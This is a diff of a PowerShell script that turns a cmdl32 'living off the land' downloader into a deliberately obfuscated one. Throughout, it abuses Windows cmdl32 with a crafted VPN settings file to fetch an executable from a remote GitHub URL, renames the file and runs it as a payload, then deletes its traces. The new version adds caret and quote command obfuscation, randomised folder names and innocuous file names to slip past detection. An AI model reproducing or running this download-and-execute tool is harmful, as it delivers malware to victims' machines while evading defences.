@@ -1,74 +1,71 @@
-Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
-# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
-# Create a temp directory to work in
-$tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
-New-Item -Path $tempDir -ItemType Directory -Force
-# Change to the temp directory
-Set-Location -Path $tempDir
-Write-Host "[*] Working directory changed to $tempDir"
-Write-Host "[*] Denying delete permissions for current user"
-# Deny delete permissions in the temp directory for the current user
-icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
-Write-Host "[*] Setting temp environment variable"
-# Set the TMP environment variable to the temp directory
-$env:TMP = $tempDir
-Write-Host "[*] Creating VPN settings file"
+Write-Host "[-] Obfuscated cmdl32 Downloader - liquidsky ^_~"
+# Thanks to Elliot Killick (@elliotkillick) for the lolbin discovery
+
+# Obfuscate temp directory name
+$t = [System.IO.Path]::Combine($env:TEMP, "cm" + "dl32_" + (Get-Random -Maximum 9999))
+New-Item -Path $t -ItemType Directory -Force > $null
+
+# Change directory
+Set-Location -Path $t
+Write-Host "[*] Working directory: $t"
+
+Write-Host "[*] Denying delete permissions"
+icacls $t /deny "$($env:USERNAME):(OI)(CI)(DE,DC)" > $null
+
+Write-Host "[*] Setting TMP environment variable"
+$env:TMP = $t
+
+Write-Host "[*] Creating obfuscated VPN settings file"
 $settingsContent = @"
 [Connection Manager]
-CMSFile=settings.txt
-ServiceName=WindowsUpdate
-TunnelFile=settings.txt
+CMSFile=s.cfg
+ServiceName=WinSvc
+TunnelFile=s.cfg
 [Settings]
-UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
+UpdateUrl=https://raw.githubusercontent.com/fuzzlove/alpha-testing/main/du.exe
 "@
-Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
-Write-Host "[*] Performing download with cmdl32"
-# Assuming cmdl32 is in system32 or accessible
-$cmdl32Path = "cmdl32"
-$arguments = "/vpn /lan `"$tempDir\settings.txt`""
+Set-Content -Path "$t\s.cfg" -Value $settingsContent
+
+Write-Host "[*] Obfuscating cmd arguments"
+# Obfuscated cmdl32 execution
+$cmdArgs = 'C""m^D""l^3^2,/l"a"n;/v^p""n "' + "$t\s.cfg" + '"'
+
+Write-Host "[*] Executing cmdl32 via cmd.exe"
 try {
-    Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
-    Write-Host "[*] Download complete with cmdl32."
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdArgs" -NoNewWindow -Wait
+    Write-Host "[*] Download successful."
 } catch {
-    Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
-    # Revert permissions before exiting
-    icacls $tempDir /remove:d "$env:USERNAME"
+    Write-Host "[!] Error during download: $($_.Exception.Message)"
+    icacls $t /remove:d "$env:USERNAME" > $null
     Exit
 }
+
 Write-Host "[*] Reverting permissions"
-icacls $tempDir /remove:d "$env:USERNAME"
+icacls $t /remove:d "$env:USERNAME" > $null
+
 Write-Host "[*] Renaming downloaded file for execution"
-$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
-if ($downloadedFile) {
-    Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
-    
-    # Construct the target path for the rename
-    $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
-    
-    # Debug output: Check the target path
-    Write-Host "[*] Target path: $targetPath"
-    
-    # Try renaming (or moving) the file using Move-Item
-    try {
-        Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
-        Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
-    } catch {
-        Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
-        Exit
-    }
+$vpnFile = Get-ChildItem -Path $t -Filter "VPN*.tmp" | Select-Object -First 1
+
+if ($vpnFile) {
+    Rename-Item -Path $vpnFile.FullName -NewName "$t\p.exe" -Force
+    Write-Host "[*] Renamed VPN*.tmp to p.exe."
 } else {
-    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
+    Write-Host "[!] No downloaded file found."
     Exit
 }
-Write-Host "[*] Executing the downloaded file"
-if (Test-Path "$tempDir\whois.exe") {
-    Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
-    Write-Host "[*] Execution complete."
+
+Write-Host "[*] Executing payload via cmd.exe"
+if (Test-Path "$t\p.exe") {
+    $execArgs = '/c "CmD"" /c start """" ""' + "$t\p.exe" + '"""'
+    Start-Process -FilePath "cmd.exe" -ArgumentList $execArgs -NoNewWindow -Wait
+    Write-Host "[*] Payload executed."
 } else {
-    Write-Host "[!] whois.exe not found after renaming. Exiting script."
+    Write-Host "[!] Payload not found."
     Exit
 }
-Write-Host "[*] Cleaning up downloaded file"
-Remove-Item -Path "$tempDir\whois.exe" -Force
-Remove-Item -Path "$tempDir\settings.txt" -Force
-Write-Host "[*] Script complete."
+
+Write-Host "[*] Cleaning up"
+Remove-Item -Path "$t\p.exe" -Force
+Remove-Item -Path "$t\s.cfg" -Force
+Remove-Item -Path $t -Recurse -Force
+Write-Host "[*] Cleanup complete. Exiting."
